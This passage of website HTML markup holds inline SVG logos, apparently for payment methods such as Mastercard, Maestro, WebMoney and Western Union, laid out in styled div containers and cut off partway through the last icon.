                d="M62.3524 11H1.64759C0.736544 11 0 11.7377 0 12.6476V50.8289C0 51.7388 0.736544 52.4765 1.64759 52.4765H62.3524C63.2635 52.4765 64 51.7388 64 50.8289V12.6476C64 11.7377 63.2635 11 62.3524 11ZM58.2538 41.1179C58.2062 41.204 58.1416 41.2697 58.0578 41.3162C57.9739 41.3626 57.8856 41.3864 57.7949 41.3864C57.702 41.3864 57.6136 41.3626 57.5297 41.3162C57.447 41.2697 57.3813 41.204 57.3326 41.1179C57.2861 41.0351 57.2623 40.9467 57.2623 40.855C57.2623 40.7632 57.2861 40.6759 57.3337 40.5898C57.3802 40.5037 57.4482 40.4391 57.532 40.3926C57.617 40.3484 57.7031 40.3246 57.7938 40.3246C57.8833 40.3246 57.9694 40.3484 58.0533 40.3926C58.1382 40.4391 58.2051 40.5037 58.2516 40.5898C58.2992 40.6759 58.3218 40.7643 58.3218 40.855C58.3218 40.9456 58.3014 41.0374 58.2538 41.1179ZM59.4414 31.7388C59.4436 40.8096 52.0941 48.166 43.0221 48.1683C38.7796 48.1694 34.911 46.5615 31.9966 43.9201C29.0822 46.5569 25.2215 48.1637 20.9858 48.1637C11.9195 48.1637 4.56091 40.8062 4.56091 31.7388C4.56091 22.7076 11.8618 15.3717 20.8805 15.3127C20.9156 15.3127 20.9507 15.3127 20.9858 15.3127C25.2215 15.3127 29.0833 16.9195 31.9977 19.5564C34.911 16.9184 38.7751 15.3105 43.0142 15.3093C52.0861 15.3059 59.4414 22.6589 59.4436 31.7309C59.4414 31.7331 59.4414 31.7343 59.4414 31.7388Z"
                fill="currentColor"
              ></path>
              <path
                d="M30.3151 42.3862C30.8352 43.0231 31.3859 43.6304 31.9944 44.1811C32.008 44.1687 32.0227 44.1573 32.0363 44.146C32.0363 44.146 32.0352 44.146 32.0352 44.1449H32.0386C32.6369 43.5998 33.1955 43.0129 33.7066 42.3862H30.3151Z"
                fill="currentColor"
              ></path>
              <path
                d="M32.5519 33.3711C32.5519 33.3711 32.7819 32.2379 32.7819 31.7767C32.7819 30.6243 32.2086 29.2192 30.289 29.2192C28.5304 29.2204 27.2284 31.115 27.2284 33.2566C27.2284 35.728 28.859 36.315 30.2494 36.315C31.5321 36.315 32.0964 36.0272 32.0964 36.0272L32.4046 34.3411C32.4046 34.3411 31.429 34.7716 30.5474 34.7716C28.6698 34.7716 28.9984 33.3711 28.9984 33.3711H32.5519ZM30.2947 30.7886C31.2817 30.7886 31.0992 31.898 31.0992 31.9864H29.1581C29.1581 31.8719 29.3417 30.7886 30.2947 30.7886Z"
                fill="currentColor"
              ></path>
              <path
                d="M40.7536 29.4517C41.6431 29.4517 42.3581 29.9514 42.3581 29.9514L42.6437 28.0987C42.6437 28.0987 41.5853 27.6704 40.6743 27.6704C38.6561 27.6704 36.6924 29.4223 36.6924 32.7118C36.6924 34.8931 37.7519 36.3333 39.8391 36.3333C40.4284 36.3333 41.3689 36.0942 41.3689 36.0942L41.6816 34.186C41.6816 34.186 40.825 34.6155 40.2357 34.6155C38.9938 34.6143 38.4963 33.667 38.4963 32.6517C38.4963 30.586 39.5638 29.4517 40.7536 29.4517Z"
                fill="currentColor"
              ></path>
              <path
                d="M28.1224 38.936C28.4069 39.5468 28.7377 40.1281 29.0924 40.6947H34.9202C35.2737 40.1304 35.5921 39.5434 35.8765 38.936H28.1224Z"
                fill="currentColor"
              ></path>
              <path
                d="M36.6607 29.3337C35.8777 29.3337 35.2975 30.4022 35.2975 30.4022L35.455 29.4198H33.8267L32.7355 36.1982H34.5304C35.0392 33.3031 35.1343 30.9529 36.3479 31.3824C36.561 30.2617 36.7661 29.8277 36.9984 29.3541C36.9984 29.3541 36.8896 29.3314 36.6607 29.3337Z"
                fill="currentColor"
              ></path>
            </svg>
          </div>
          <div
            class="w-1/12 sm:flex sm:justify-center sm:w-1/4 text-svg hover:text-btn-hover transition"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="64"
              height="64"
              viewBox="0 0 64 64"
              fill="none"
            >
              <path
                d="M35.8459 24.9995H28.3592C27.881 25.9049 27.5638 26.5893 27.4742 26.7593H36.5553C36.3502 26.1542 36.1145 25.5684 35.8459 24.9995Z"
                fill="currentColor"
              ></path>
              <path
                d="M24.5643 29.3589C23.8448 29.3589 23.2181 29.4507 22.2436 29.6977L21.9887 31.147L22.1507 31.1051L22.4295 31.0348C22.8465 30.9238 23.4731 30.8569 24.0306 30.8569C24.9348 30.8569 25.2838 31.0155 25.2838 31.4405C25.2838 31.5583 25.2601 31.6467 25.2136 31.8586C24.9122 31.8269 24.6334 31.8087 24.4249 31.8087C22.2674 31.8087 21.0142 32.7255 21.0142 34.2892C21.0142 35.3294 21.7337 36.0467 22.7785 36.0467C23.6601 36.0467 24.3343 35.7985 24.8204 35.2694L24.7739 35.9357H26.3977L26.4204 35.7612L26.4442 35.5402L26.4906 35.2138L26.5598 34.8059L26.9779 32.5192C27.0946 31.8031 27.1173 31.5617 27.1173 31.2444C27.1173 30.0138 26.2357 29.3589 24.5643 29.3589ZM23.5909 34.6824C23.1501 34.6824 22.8952 34.424 22.8952 34.0263C22.8952 33.3759 23.4527 33.0473 24.5428 33.0473C24.6822 33.0473 24.7751 33.0507 24.9847 33.0722C24.9371 34.024 24.3796 34.6824 23.5909 34.6824Z"
                fill="currentColor"
              ></path>
              <path
                d="M18.4623 28.0249L16.3037 32.9258L16.1643 28.0249H13.1241L11.6147 35.9388H13.3779L14.5383 29.8923L14.8635 35.9388H16.6278L19.2963 29.8538L18.136 35.9388H20.085L21.617 28.0249H18.4623Z"
                fill="currentColor"
              ></path>
              <path
                d="M53.9015 35.3464C53.9003 35.3034 53.8777 35.2592 53.855 35.2354C53.8085 35.2127 53.7621 35.2104 53.7394 35.2104H53.5536V35.6546H53.6465V35.4813H53.7156L53.7859 35.6546H53.9015L53.8323 35.462C53.8788 35.4427 53.9015 35.3952 53.9015 35.3464ZM53.7621 35.3963C53.7394 35.4054 53.7156 35.4054 53.7156 35.4054H53.6454V35.2898H53.6941C53.7168 35.2898 53.7632 35.2898 53.7632 35.3C53.787 35.309 53.787 35.3272 53.787 35.3442C53.787 35.3634 53.7847 35.3861 53.7621 35.3963Z"
                fill="currentColor"
              ></path>
              <path
                d="M57.9762 41.0051C57.9739 40.9609 57.9524 40.9167 57.9286 40.8941C57.8822 40.8714 57.8357 40.8691 57.8119 40.8691H57.6272V41.3133H57.7201V41.1388H57.7892L57.8595 41.3133H57.9762L57.906 41.1196C57.9524 41.1026 57.9762 41.055 57.9762 41.0051ZM57.8357 41.055C57.8119 41.064 57.7892 41.064 57.7892 41.064H57.719V40.9496H57.7654C57.7892 40.9496 57.8357 40.9496 57.8357 40.9587C57.8595 40.9677 57.8595 40.987 57.8595 41.0029C57.8595 41.0232 57.8595 41.0436 57.8357 41.055Z"
                fill="currentColor"
              ></path>
              <path
                d="M62.3524 11.2622H1.64759C0.736544 11.2622 0 11.9999 0 12.9098V51.0911C0 52.001 0.736544 52.7387 1.64759 52.7387H62.3524C63.2635 52.7387 64 52.001 64 51.0911V12.9098C64 11.9999 63.2635 11.2622 62.3524 11.2622ZM58.2538 41.3801C58.2062 41.4662 58.1416 41.5319 58.0578 41.5784C57.9739 41.6248 57.8856 41.6486 57.7949 41.6486C57.702 41.6486 57.6136 41.6248 57.5297 41.5784C57.447 41.5319 57.3813 41.4662 57.3326 41.3801C57.2861 41.2973 57.2623 41.209 57.2623 41.1172C57.2623 41.0254 57.2861 40.9381 57.3337 40.852C57.3802 40.7659 57.4482 40.7013 57.532 40.6548C57.617 40.6106 57.7031 40.5869 57.7938 40.5869C57.8833 40.5869 57.9694 40.6106 58.0533 40.6548C58.1382 40.7013 58.2051 40.7659 58.2516 40.852C58.2992 40.9381 58.3218 41.0265 58.3218 41.1172C58.3218 41.2078 58.3014 41.2996 58.2538 41.3801ZM59.4414 32.001C59.4436 41.0718 52.0941 48.4282 43.0221 48.4305C38.7796 48.4316 34.911 46.8237 31.9966 44.1823C29.0822 46.8191 25.2215 48.4259 20.9858 48.4259C11.9195 48.4259 4.56091 41.0684 4.56091 32.001C4.56091 22.9699 11.8618 15.6339 20.8805 15.575C20.9156 15.575 20.9507 15.575 20.9858 15.575C25.2215 15.575 29.0833 17.1818 31.9977 19.8186C34.911 17.1806 38.7751 15.5727 43.0142 15.5716C52.0861 15.5682 59.4414 22.9211 59.4436 31.9931C59.4414 31.9953 59.4414 31.9965 59.4414 32.001Z"
                fill="currentColor"
              ></path>
              <path
                d="M33.6237 21.5151H30.5031C30.0838 22.0817 29.6895 22.6845 29.3325 23.2738H34.8997C34.5133 22.6596 34.0861 22.0726 33.6237 21.5151Z"
                fill="currentColor"
              ></path>
              <path
                d="M37.0753 30.8781C37.4708 30.8781 37.9807 30.9121 38.4918 30.9722L38.7705 29.4843C38.2595 29.4141 37.4935 29.3574 37.0289 29.3574C34.8487 29.3574 34.0804 30.3478 34.0816 31.5319C34.0816 32.3433 34.5462 32.9042 35.5898 33.3257C36.3773 33.6464 36.4952 33.7416 36.4952 34.0362C36.4952 34.435 36.1484 34.6163 35.3824 34.6163C34.7773 34.6163 34.2447 34.537 33.617 34.3625L33.3394 35.8469L33.4323 35.8639L33.7801 35.9274C33.8957 35.9501 34.0816 35.9693 34.3139 35.9852C34.7773 36.0192 35.1241 36.0384 35.3801 36.0384C37.4697 36.0384 38.4215 35.3597 38.4215 33.8923C38.4215 33.0084 38.0272 32.4928 37.0289 32.1008C36.2164 31.7756 36.1235 31.7019 36.1235 31.4005C36.1235 31.0549 36.4476 30.8781 37.0753 30.8781Z"
                fill="currentColor"
              ></path>
              <path
                d="M47.2442 29.488C47.1501 29.4653 47.0799 29.4529 47.0799 29.4495C47.0107 29.4393 46.9405 29.4336 46.8702 29.4336C46.2425 29.4336 45.779 29.7191 45.1762 30.4795L45.362 29.5027H43.5977L42.4136 35.939H44.3637C45.0606 32.0036 45.3609 31.3123 46.2889 31.3123C46.3592 31.3123 46.4283 31.318 46.5212 31.3282L46.7535 31.3758L47.4527 29.5582C47.2906 29.4959 47.2668 29.4959 47.2442 29.488Z"
                fill="currentColor"
              ></path>
              <path
                d="M41.3915 31.0676H42.3898L42.6685 29.5015H41.6714L41.9501 28.0239H40.0238L39.1184 32.9372L39.0255 33.446L38.9088 34.0794C38.885 34.2834 38.8623 34.476 38.8623 34.6562C38.8623 35.5695 39.396 36.0704 40.3943 36.0704C40.8351 36.0704 41.2532 36.0069 41.7869 35.8608L42.0419 34.433C41.9048 34.4749 41.7416 34.4953 41.532 34.4953C41.0685 34.4953 40.8578 34.3525 40.8578 34.0194C40.8578 33.9605 40.8578 33.871 40.8816 33.7531L41.3915 31.0676Z"
                fill="currentColor"
              ></path>
              <path
                d="M53.7156 34.9326C53.4369 34.9326 53.2046 35.1581 53.2046 35.4335C53.2046 35.7122 53.4369 35.9377 53.7156 35.9377C53.9944 35.9377 54.2267 35.7122 54.2267 35.4335C54.2267 35.1592 53.9944 34.9326 53.7156 34.9326ZM53.7156 35.8176C53.5071 35.8176 53.3213 35.6465 53.3213 35.4335C53.3213 35.2227 53.5071 35.0527 53.7156 35.0527C53.9264 35.0527 54.0873 35.2227 54.0873 35.4335C54.0873 35.6465 53.9264 35.8176 53.7156 35.8176Z"
                fill="currentColor"
              ></path>
              <path
                d="M50.4668 29.3188C48.1462 29.3188 46.6379 30.8656 46.6379 33.1443C46.6379 34.7772 47.5184 36.112 49.7258 36.112C51.7201 36.112 53.2056 35.1613 53.5082 33.022C53.5547 32.648 53.5547 32.622 53.5547 32.2231C53.5547 30.5891 52.4872 29.3188 50.4668 29.3188ZM51.4187 32.9664C51.2566 33.9693 50.3524 34.5438 49.9343 34.5438C49.2374 34.5574 48.8204 33.9693 48.8204 33.0956C48.8204 32.0622 49.4232 30.8894 50.4215 30.8894C51.2102 30.8894 51.4878 31.5273 51.4878 32.1982C51.4878 32.4769 51.4651 32.7307 51.4187 32.9664Z"
                fill="currentColor"
              ></path>
              <path
                d="M33.243 33.2703C33.4074 32.6176 33.4776 32.1552 33.4776 31.6793C33.4776 30.2527 32.4555 29.3428 30.8555 29.3428C28.9054 29.3428 27.4674 30.9688 27.4674 33.1751C27.4663 35.0731 28.604 36.0601 30.7853 36.0601C31.4583 36.0601 32.1076 35.9751 32.7581 35.8006L33.0821 34.1892C32.3864 34.4725 31.7598 34.5983 31.0629 34.5983C29.949 34.5983 29.3688 34.2187 29.3688 33.4731C29.3688 33.413 29.3688 33.3688 29.3926 33.2703H33.243ZM30.8317 30.8159C31.4119 30.8159 31.7371 31.1207 31.7371 31.6431C31.7371 31.7292 31.7371 31.8357 31.7371 31.9739L29.5785 31.9717C29.7643 31.2238 30.2062 30.8159 30.8317 30.8159Z"
                fill="currentColor"
              ></path>
              <path
                d="M28.1224 38.937C28.4069 39.5466 28.7389 40.1279 29.0924 40.6957H34.9202C35.2737 40.1302 35.5933 39.5444 35.8765 38.937H28.1224Z"
                fill="currentColor"
              ></path>
              <path
                d="M30.3151 42.3828C30.8352 43.0208 31.3859 43.6293 31.9944 44.1777C32.008 44.1652 32.0227 44.1551 32.0363 44.1415H32.0386C32.6369 43.5964 33.1955 43.0094 33.7066 42.3828H30.3151Z"
                fill="currentColor"
              ></path>
            </svg>
          </div>
          <div
            class="w-1/12 sm:flex sm:justify-end sm:w-1/3 text-svg hover:text-btn-hover transition"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="64"
              height="64"
              viewBox="0 0 64 64"
              fill="none"
            >
              <path
                d="M62.3524 11.2622H1.64759C0.736544 11.2622 0 11.9999 0 12.9098V51.0911C0 52.001 0.736544 52.7387 1.64759 52.7387H62.3524C63.2635 52.7387 64 52.001 64 51.0911V12.9098C64 11.9999 63.2635 11.2622 62.3524 11.2622ZM59.132 29.7495L58.2493 30.5461L57.4527 29.6611L58.3365 28.8645L59.132 29.7495ZM54.5858 28.9778L53.3904 27.6497L54.7184 26.4543L55.9139 27.7823L54.5858 28.9778ZM55.9411 29.124L57.1377 30.4509L55.8096 31.6463L54.6142 30.3194L55.9411 29.124ZM53.506 28.6843L51.736 30.2775L50.1439 28.5075L51.9139 26.9143L53.506 28.6843ZM53.1785 29.9342L54.7717 31.7041L53.0017 33.2962L51.4085 31.5262L53.1785 29.9342ZM54.4374 32.9937L56.0306 34.7636L54.2606 36.3591L52.6674 34.5891L54.4374 32.9937ZM55.7484 33.124L57.0765 31.9274L58.2731 33.2554L56.945 34.4509L55.7484 33.124ZM58.0034 27.1183L57.1184 27.9149L56.3218 27.0299L57.2068 26.2333L58.0034 27.1183ZM9.28045 34.9529H8.36261L7.20793 30.716H7.14788L6.0272 34.9529H5.10935L3.73371 28.9336H4.68555L5.63626 33.4254H5.69632L6.8 28.9336H7.55581L8.73654 33.4254H8.7966L9.66346 28.9336H10.6572L9.28045 34.9529ZM14.5473 32.9937H11.7802C11.7802 34.0112 12.196 34.4633 13.0708 34.4633C13.5286 34.4633 13.9535 34.3013 14.4204 34.0214V34.6662C14.0385 34.886 13.5286 35.0571 12.9178 35.0571C11.4912 35.0571 10.9054 34.1744 10.9054 32.8316C10.9054 31.541 11.5592 30.6084 12.8329 30.6084C13.8946 30.6084 14.5484 31.2962 14.5484 32.682L14.5473 32.9937ZM16.9756 35.056C16.5258 35.056 15.8289 34.9109 15.319 34.6401V28.7138L16.2017 28.5019V30.9223C16.4578 30.7863 16.8895 30.6084 17.3496 30.6084C18.4023 30.6084 18.9711 31.3393 18.9711 32.6979C18.9711 34.2854 18.2074 35.056 16.9756 35.056ZM25.7496 34.9529H25.7473H24.8306V30.588H24.7547L23.0221 34.9529H22.4793L20.7467 30.69H20.6708V34.9529H19.9071V28.9336H20.9337L22.8363 33.6803H22.8793L24.6969 28.9336H25.7496V34.9529ZM28.6187 35.056C27.4561 35.056 26.6822 34.282 26.6822 32.8305C26.6822 31.3438 27.498 30.6072 28.6187 30.6072C29.7394 30.6072 30.5552 31.3461 30.5552 32.8305C30.5552 34.2854 29.7824 35.056 28.6187 35.056ZM34.928 34.9529H34.0453V32.0735C34.0453 31.4039 33.7156 31.2849 33.2805 31.2849C32.9405 31.2849 32.5076 31.4378 32.2448 31.5908V34.9529H31.362V31.2339C31.7439 31.005 32.5507 30.6061 33.5275 30.6061C34.5462 30.6061 34.928 31.005 34.928 31.8798V34.9529ZM39.3609 32.9937H36.5926C36.5926 34.0112 37.0085 34.4633 37.8856 34.4633C38.3433 34.4633 38.7683 34.3013 39.234 34.0214V34.6662C38.851 34.886 38.3433 35.0571 37.7303 35.0571C36.3037 35.0571 35.7201 34.1744 35.7201 32.8316C35.7201 31.541 36.3739 30.6084 37.6465 30.6084C38.7094 30.6084 39.3632 31.2962 39.3632 32.682L39.3609 32.9937ZM42.0351 34.9971C41.6102 36.1676 41.0924 36.7795 40.1178 36.7795V36.0837C40.6958 36.0837 41.0504 35.6259 41.2555 34.9971L39.6261 30.75H40.5598L41.6465 33.8752H41.6975L42.6652 30.75H43.5739L42.0351 34.9971ZM56.434 38.4724C55.3518 39.09 54.0975 39.4424 52.766 39.4424C48.6674 39.4424 45.3235 36.0996 45.3235 32.001C45.3235 27.9024 48.6674 24.5585 52.766 24.5585C53.9331 24.5585 55.0414 24.8305 56.0272 25.3132C56.1824 25.3869 56.3365 25.4684 56.4895 25.5568L55.8051 26.1699L54.7762 25.1058L53.0391 26.656L52.0091 25.5296L48.7717 28.4463L50.8465 30.7342L50.0306 31.4503L52.0748 33.7404L51.2635 34.4565L54.1847 37.7075L55.9161 36.1121L57.4142 37.8231C57.1173 38.052 56.7932 38.2696 56.434 38.4724ZM58.1122 37.1308L56.9156 35.805L58.2436 34.6084L59.4391 35.9353L58.1122 37.1308ZM59.379 33.1738L58.5824 32.2888L59.4674 31.4922L60.264 32.3772L59.379 33.1738Z"
                fill="currentColor"
              ></path>
              <path
                d="M28.6187 31.2021C28.059 31.2021 27.574 31.6849 27.574 32.8316C27.574 33.9954 28.0159 34.4622 28.6187 34.4622C29.2216 34.4622 29.6635 33.9954 29.6635 32.8316C29.6635 31.6837 29.1955 31.2021 28.6187 31.2021Z"
                fill="currentColor"
              ></path>
              <path
                d="M17.1196 31.2705C16.7819 31.2705 16.5349 31.3634 16.1949 31.5504V34.3277C16.4669 34.4467 16.7627 34.4637 16.9757 34.4637C17.6046 34.4637 18.0805 34.0728 18.0805 32.6971C18.0805 31.6184 17.6884 31.2705 17.1196 31.2705Z"
                fill="currentColor"
              ></path>
              <path
                d="M37.6205 31.1763C37.1015 31.1763 36.7026 31.5751 36.6074 32.4239H38.5542C38.5122 31.5332 38.0782 31.1763 37.6205 31.1763Z"
                fill="currentColor"
              ></path>
              <path
                d="M12.8068 31.1763C12.2889 31.1763 11.8889 31.5751 11.796 32.4239H13.7405C13.6986 31.5332 13.2657 31.1763 12.8068 31.1763Z"
                fill="currentColor"
              ></path>
            </svg>
          </div>
          <div
            class="w-1/12 sm:flex sm:justify-start sm:w-1/3 text-svg hover:text-btn-hover transition"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="64"
              height="64"
              viewBox="0 0 64 64"
              fill="none"
            >
              <path
                d="M62.3524 11.2622H1.64759C0.736544 11.2622 0 11.9999 0 12.9098V51.09C0 51.9999 0.736544 52.7387 1.64759 52.7387H62.3524C63.2635 52.7387 64 52.001 64 51.0911V12.9098C64 11.9999 63.2635 11.2622 62.3524 11.2622ZM41.6782 33.8548H48.8669V35.584H43.6816V37.6384H48.4442V39.3653H43.6816V41.8979H49.0969V43.6259H41.6782V33.8548ZM37.6646 23.524C37.9309 23.1988 38.0872 22.8293 38.2629 22.4849C38.4544 22.1449 38.5688 21.7959 38.664 21.4673C38.7547 21.1387 38.8895 20.8407 38.9235 20.5619C38.9677 20.282 39.0085 20.0384 39.038 19.8378C39.1037 19.431 39.1399 19.1988 39.1399 19.1988C39.1399 19.1988 39.1547 19.4333 39.1785 19.8435C39.1921 20.0509 39.2045 20.3047 39.2238 20.5937C39.2487 20.886 39.1853 21.209 39.1626 21.5716C39.1377 21.9342 39.098 22.3296 38.9745 22.733C38.8703 23.141 38.7819 23.5886 38.5734 24.0078C38.4827 24.2254 38.3875 24.4452 38.2912 24.6684C38.1881 24.8894 38.0453 25.09 37.9207 25.3053C37.6759 25.7472 37.3564 26.1393 37.0266 26.5325C36.7082 26.9404 36.3116 27.2599 35.9513 27.6214C35.5513 27.9217 35.1739 28.2673 34.7649 28.5132C34.3649 28.7829 33.9683 29.0265 33.5762 29.2282C33.1909 29.4514 32.8068 29.6078 32.4567 29.7755C31.9139 30.0056 31.4334 30.1846 31.0357 30.3138C31.2159 30.7217 31.3722 31.1466 31.4924 31.601C31.6147 32.069 31.7258 32.5472 31.753 33.0934C31.2204 32.9619 30.7728 32.7614 30.3388 32.5506C29.9048 32.3364 29.5059 32.0939 29.1331 31.8333C28.383 31.3132 27.7371 30.7047 27.1479 30.0509C26.7014 29.5546 26.6414 28.8463 26.9473 28.2934L27.0108 28.1835C27.5071 27.2939 28.1031 26.4633 28.834 25.7143C29.1955 25.3381 29.5955 24.9857 30.0397 24.6582C30.2674 24.4962 30.5009 24.3398 30.7433 24.1891C30.9938 24.0429 31.2601 23.9058 31.5513 23.7846C31.5807 24.0973 31.5864 24.3976 31.5705 24.6866C31.5513 24.9721 31.5229 25.252 31.489 25.5285C31.4074 26.0735 31.2839 26.5925 31.1195 27.0888C31.1014 27.1421 31.0799 27.192 31.0629 27.2452C31.2363 27.2191 31.4176 27.1897 31.6136 27.1546C31.9207 27.0798 32.2686 27.0254 32.6153 26.9121C32.9745 26.8203 33.3394 26.6945 33.7088 26.5472C34.0963 26.4203 34.4408 26.2095 34.834 26.0384C35.1751 25.8118 35.5796 25.6225 35.9014 25.3483C36.2425 25.0877 36.587 24.8225 36.8623 24.5007C37.0074 24.3444 37.1728 24.2005 37.2997 24.035C37.421 23.8639 37.5422 23.6951 37.6646 23.524ZM24.5042 24.7285C24.5405 24.3659 24.5904 23.9727 24.7263 23.5727C24.8431 23.1682 24.9439 22.724 25.1649 22.3104C25.2635 22.0973 25.3632 21.8786 25.4663 21.6588C25.5762 21.4424 25.7258 21.2463 25.8572 21.0344C26.1133 20.5993 26.4465 20.2174 26.7875 19.8344C27.1173 19.4344 27.5252 19.1285 27.8958 18.7772C28.3025 18.4894 28.6901 18.1563 29.106 17.9217C29.5139 17.6633 29.9173 17.431 30.3161 17.2418C30.7071 17.031 31.0969 16.886 31.4516 16.7285C32 16.5155 32.4873 16.35 32.8884 16.2322C32.7207 15.8197 32.5768 15.3903 32.4691 14.9325C32.3603 14.4611 32.264 13.9795 32.2527 13.4322C32.7796 13.5795 33.2227 13.7948 33.651 14.018C34.0782 14.2446 34.4691 14.4973 34.834 14.7716C35.5683 15.3143 36.196 15.9421 36.766 16.6129C37.1977 17.1217 37.2351 17.8322 36.9133 18.375L36.8476 18.4837C36.3229 19.3585 35.7009 20.1699 34.9507 20.8973C34.5768 21.2633 34.1643 21.6044 33.7133 21.9183C33.481 22.0713 33.2419 22.2208 32.9938 22.3648C32.7388 22.5041 32.4691 22.6322 32.1745 22.7455C32.1552 22.4305 32.1586 22.1302 32.1813 21.8424C32.2108 21.5568 32.247 21.2781 32.2901 21.0027C32.3887 20.4611 32.5269 19.9455 32.706 19.4537C32.7252 19.4016 32.7467 19.3517 32.7671 19.2996C32.5926 19.32 32.4113 19.3438 32.2142 19.3733C31.9048 19.439 31.5547 19.4843 31.2045 19.5863C30.8431 19.6679 30.4759 19.7823 30.1008 19.9183C29.7088 20.0327 29.3575 20.2333 28.9598 20.3931C28.6096 20.6095 28.204 20.7874 27.872 21.0514C27.5241 21.303 27.1728 21.5568 26.8861 21.8707C26.7399 22.0225 26.57 22.1608 26.4374 22.324C26.3105 22.4905 26.1847 22.6571 26.0612 22.8203C25.7858 23.1376 25.6181 23.5024 25.4323 23.8424C25.2272 24.1755 25.1048 24.5211 24.9983 24.8475C24.8975 25.1727 24.7547 25.4673 24.7116 25.7449C24.6595 26.0225 24.613 26.265 24.5756 26.4645C24.4997 26.8701 24.4567 27.1013 24.4567 27.1013C24.4567 27.1013 24.4487 26.8667 24.4351 26.4554C24.4295 26.2469 24.4215 25.9942 24.4125 25.7041C24.3943 25.4118 24.4691 25.0911 24.5042 24.7285ZM18.6119 45.7449H17.2045V49.5716H16.2357V45.7449H14.8306V44.9211H18.613L18.6119 45.7449ZM17.1524 43.6259L14.3898 33.8526H16.5654C17.8176 39.2044 17.9422 39.8843 18.119 40.9993H18.1462C18.3229 39.9784 18.4714 38.9846 19.5071 33.8526H21.6714C22.8136 39.218 22.911 39.7347 23.1275 40.9993H23.1547C23.3178 40.0735 23.4799 39.2293 24.7479 33.8526H26.817L24.0657 43.6259H22.1065C21.0992 38.835 20.9201 37.882 20.5949 36.0033H20.5688C20.2674 37.8832 20.1065 38.5891 19.0572 43.6259H17.1524ZM22.0113 49.5682C21.9467 49.3495 21.9093 49.1104 21.9093 48.6299C21.9093 47.9976 21.8697 47.7495 21.1501 47.7495H20.1473V49.5693H19.1932V44.9177H21.5456C22.783 44.9177 23.0085 45.8333 23.0085 46.2344C23.0085 46.7466 22.749 47.1863 22.289 47.3427C22.6708 47.5092 22.8793 47.6531 22.8793 48.5211C22.8793 49.1999 22.8793 49.3699 23.0856 49.4458L23.0867 49.5682H22.0113ZM26.7445 49.5716L26.4453 48.6129H24.7297L24.4068 49.5716H23.3824L25.0402 44.9211H26.162L27.7994 49.5716H26.7445ZM27.8992 33.8526H29.9399V43.6259H27.8992V33.8526ZM31.1977 49.5716L29.3008 46.256H29.2873V49.5716H28.3819V44.9211H29.404L31.2521 48.1585H31.2635V44.9211H32.17L32.1711 49.5716H31.1977ZM34.8578 49.6962C33.1603 49.6962 32.8703 48.7172 32.8703 48.1415H33.7994C33.8062 48.401 33.9365 48.8928 34.7864 48.8928C35.2442 48.8928 35.7575 48.7829 35.7575 48.2911C35.7575 47.9274 35.4085 47.8311 34.9144 47.7143L34.417 47.5976C33.6646 47.4231 32.9405 47.2543 32.9405 46.2299C32.9405 45.7121 33.217 44.7988 34.7263 44.7988C36.1518 44.7988 36.5326 45.7313 36.5394 46.3013H35.6102C35.5807 46.0951 35.506 45.6021 34.6561 45.6021C34.289 45.6021 33.8459 45.737 33.8459 46.1585C33.8459 46.5223 34.145 46.5993 34.3399 46.6446L35.4708 46.9234C36.1076 47.0798 36.6901 47.3393 36.6901 48.1733C36.6901 49.5716 35.2646 49.6962 34.8578 49.6962ZM35.9569 39.8005H33.8482V43.6259H31.8448V33.8514H36.7841C39.3847 33.8514 39.8629 35.771 39.8629 36.6152C39.8629 37.6917 39.319 38.6163 38.3513 38.9427C39.1547 39.2973 39.5898 39.5988 39.5898 41.422C39.5898 42.8509 39.5898 43.2056 40.0261 43.3676V43.6259H37.7688C37.6329 43.1636 37.5513 42.6605 37.5513 41.652C37.5513 40.3183 37.4686 39.8016 35.9569 39.8005ZM40.7411 45.7449H38.4045V46.7942H40.4499V47.6169H38.4045V49.5727H37.4334V44.9223H40.7411V45.7449ZM44.9246 49.5693H41.3949V44.9177H44.8147V45.7427H42.3467V46.7206H44.613V47.5432H42.3467V48.7478H44.9246V49.5693ZM49.6113 49.5693H48.5382C48.4737 49.3495 48.4363 49.1104 48.4363 48.6299C48.4363 47.9976 48.3943 47.7495 47.6771 47.7495H46.6742V49.5693H45.7201V44.9177H48.0703C49.3077 44.9177 49.5354 45.8333 49.5354 46.2344C49.5354 46.7466 49.2725 47.1863 48.8147 47.3427C49.1955 47.5092 49.4051 47.6531 49.4051 48.5211C49.4051 49.1999 49.4051 49.3699 49.6102 49.4458H49.6113V49.5693Z"
                fill="currentColor"
              ></path>
              <path
                d="M36.3932 35.542H33.8505V38.155H36.2425C37.3054 38.155 37.8233 37.7879 37.8233 36.8213C37.8233 36.3046 37.5932 35.542 36.3932 35.542Z"
                fill="currentColor"
              ></path>
              <path
                d="M47.881 45.7256H46.6731V46.9698H47.8108C48.3173 46.9698 48.5632 46.7941 48.5632 46.3341C48.5632 46.0871 48.4533 45.7256 47.881 45.7256Z"
                fill="currentColor"
              ></path>
              <path
                d="M25.5955 45.9717H25.5864L24.9893 47.8108H26.1757L25.5955 45.9717Z"
                fill="currentColor"
              ></path>
              <path
                d="M21.3564 45.7256H20.1462V46.9698H21.2839C21.7904 46.9698 22.0363 46.7953 22.0363 46.3341C22.0363 46.0871 21.9253 45.7256 21.3564 45.7256Z"
                fill="currentColor"
              ></path>
            </svg>
          </div>
        </div>

        <div
          class="w-8/12 sm:w-full flex sm:flex-wrap items-center justify-center"
        >
          <div
            class="w-2/12 sm:-mr-1 sm:flex sm:justify-center sm:w-1/3 text-svg hover:text-btn-hover transition"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="120"
              height="120"
              viewBox="0 0 120 120"
              fill="none"
            >
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
